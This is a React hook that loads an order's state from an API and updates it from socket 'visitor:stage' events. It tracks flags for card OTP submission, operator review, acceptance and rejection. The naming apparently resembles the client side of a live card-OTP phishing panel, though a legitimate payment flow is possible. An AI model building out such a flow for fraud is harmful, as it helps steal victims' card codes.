import axios from "axios";
import { useCallback, useEffect, useState } from "react";
import { api_route, socket } from "../socketApi";

export function useOrderSession(orderId) {
  const [state, setState] = useState({
    cardOtpAccept: false,
    rejectReason: null,
    reviewCardOtp: false,
    cardOtpSubmitted: false,
    branchApplicationAccepted: false,
    reviewBranchApplication: false,
    hydrated: false,
  });

  const applyPayload = useCallback((payload) => {
    setState({
      cardOtpAccept: !!payload.cardOtpAccept,
      rejectReason: payload.rejectReason ?? null,
      reviewCardOtp: !!payload.reviewCardOtp,
      cardOtpSubmitted: !!payload.cardOtpSubmitted,
      branchApplicationAccepted: !!payload.branchApplicationAccepted,
      reviewBranchApplication: !!payload.reviewBranchApplication,
      hydrated: true,
    });
  }, []);

  useEffect(() => {
    if (!orderId) {
      setState({
        cardOtpAccept: false,
        rejectReason: null,
        reviewCardOtp: false,
        cardOtpSubmitted: false,
        branchApplicationAccepted: false,
        reviewBranchApplication: false,
        hydrated: false,
      });
      return;
    }

    let cancelled = false;

    (async () => {
      try {
        const { data } = await axios.get(
          `${api_route}/order/${orderId}/state`,
        );
        if (!cancelled) applyPayload(data);
      } catch {
        if (!cancelled) {
          applyPayload({
            cardOtpAccept: false,
            rejectReason: null,
            reviewCardOtp: false,
            cardOtpSubmitted: false,
            branchApplicationAccepted: false,
            reviewBranchApplication: false,
          });
        }
      }
    })();

    const onStage = (payload) => {
      if (
        payload?.orderId &&
        String(payload.orderId) !== String(orderId)
      ) {
        return;
      }
      applyPayload(payload);
    };

    socket.emit("joinOrder", { orderId });
    socket.on("visitor:stage", onStage);

    return () => {
      cancelled = true;
      socket.off("visitor:stage", onStage);
    };
  }, [orderId, applyPayload]);

  return state;
}
